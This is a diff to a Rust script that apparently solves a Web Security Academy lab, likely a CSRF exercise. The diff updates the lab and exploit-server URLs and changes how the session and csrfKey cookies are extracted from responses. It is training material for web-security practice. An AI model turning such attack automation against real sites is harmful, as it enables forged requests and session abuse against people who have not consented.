@@ -41,10 +41,10 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let lab_url = "https://0ae4003104d4c51d806e303700380006.web-security-academy.net";
+    let lab_url = "https://0ae90066030b6cd98bda085500360084.web-security-academy.net";
 
     // change this to your exploit server URL
-    let exploit_server_url = "https://exploit-0ae0006c04dcc52a80022f5e01eb0010.exploit-server.net";
+    let exploit_server_url = "https://exploit-0a3e002c030e6cdf8b0907f601ed0062.exploit-server.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
@@ -69,7 +69,7 @@ fn main() {
     io::stdout().flush();
 
     // extract session cookie
-    let mut session = extract_from_multiple_cookies(&login_page.headers().clone(), "cookie")
+    let mut session = extract_from_multiple_cookies(&login_page.headers().clone(), "session")
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
 
     // extract csrfKey cookie
@@ -233,14 +233,14 @@ fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
     }
 }
 
-/**********************************************************
-* Function to extract session field from multiple cookies
-***********************************************************/
+/******************************************************
+* Function to extract values from multiple cookies
+*******************************************************/
 fn extract_from_multiple_cookies(headers: &HeaderMap, cookie_name: &str) -> Option<String> {
     let mut cookie: Option<_> = None;
 
     match cookie_name {
-        "cookie" => cookie = headers.get_all("set-cookie").iter().nth(1),
+        "session" => cookie = headers.get_all("set-cookie").iter().nth(1),
         "csrfKey" => cookie = headers.get_all("set-cookie").iter().nth(0),
         _ => (),
     }
@@ -248,15 +248,15 @@ fn extract_from_multiple_cookies(headers: &HeaderMap, cookie_name: &str) -> Opti
     let text = cookie.unwrap().to_str().unwrap();
 
     match cookie_name {
-        "cookie" => {
-            if let Some(session) = capture_pattern("session=(.*); Secure", text) {
+        "session" => {
+            if let Some(session) = capture_pattern("session=(.*);", text) {
                 Some(session.as_str().to_string())
             } else {
                 None
             }
         }
         "csrfKey" => {
-            if let Some(token) = capture_pattern("csrfKey=(.*); Secure", text) {
+            if let Some(token) = capture_pattern("csrfKey=(.*);", text) {
                 Some(token.as_str().to_string())
             } else {
                 None
